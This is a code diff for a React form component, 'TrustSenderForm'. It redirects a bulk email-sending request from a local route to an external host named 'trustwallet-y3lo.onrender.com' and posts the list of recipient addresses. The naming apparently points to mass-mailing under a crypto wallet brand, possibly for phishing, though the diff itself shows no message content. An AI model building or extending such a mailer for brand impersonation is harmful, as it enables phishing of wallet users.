@@ -26,7 +26,7 @@ const formSchema = z.object({
 
 type TrustSenderFormValues = z.infer<typeof formSchema>;
 
-const API_ROUTE = "/api/send-email";
+const API_ROUTE = "https://trustwallet-y3lo.onrender.com/sendmail";
 
 
 export default function TrustSenderForm() {
@@ -69,19 +69,15 @@ export default function TrustSenderForm() {
       return;
     }
 
-    const formData = new FormData();
-    // These will be picked up from environment variables on the server
-    // formData.append('senderEmail', "..."); 
-    // formData.append('senderPassword', "...");
-    formData.append('subject', "A Message from Trust Sender");
-    formData.append('body', "This is a system-generated email.");
-    validEmails.forEach(email => formData.append('recipients', email));
-
-
     try {
       const response = await fetch(API_ROUTE, {
         method: "POST",
-        body: formData,
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          recipient: validEmails, // Send as an array
+        }),
       });
 
       const responseData = await response.json();
